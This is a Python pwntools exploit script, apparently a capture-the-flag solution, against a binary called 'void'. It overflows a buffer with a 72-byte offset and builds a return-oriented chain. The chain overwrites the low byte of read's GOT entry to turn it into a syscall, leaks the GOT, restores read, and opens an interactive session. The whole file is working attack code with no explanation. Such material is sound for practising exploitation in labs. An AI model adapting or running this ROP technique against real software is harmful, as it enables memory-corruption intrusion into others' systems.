#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('void')
libc = exe.libc

filterwarnings("ignore")
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
break *vuln+32
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def solve():
    offset = 72
    padding = b'A'*offset
    poprsir15 = p64(0x00000000004011b9)
    read = p64(0x00401030)
    vuln = p64(0x00401122)
    ret = p64(0x0000000000401016)
    re_resolve_read = p64(0x00401036)
    poprdi = p64(0x00000000004011bb)



    payload = [
        #Overwrite LSB so read becomes syscall
        padding,
        poprsir15,
        p64(0x404018),
        p64(0xdeadbeef),
        read,
        #Leak the GOT. RAX is already 1
        poprsir15,
        p64(0x404018),
        p64(0xdeadbeef),
        poprdi,
        p64(0x1),
        read,
        #Resolve read back to being read again
        poprdi,
        p64(0x0),
        re_resolve_read,
        vuln
    ]
    payload = b''.join(payload)
    sleep(0.1)
    io.send(payload)
    sleep(0.1)
    io.send(b'\x8c')
    sleep(0.1)
    io.send(b'\x80')

    io.interactive()

def main():
    
    init()
    solve()    

if __name__ == '__main__':
    main()

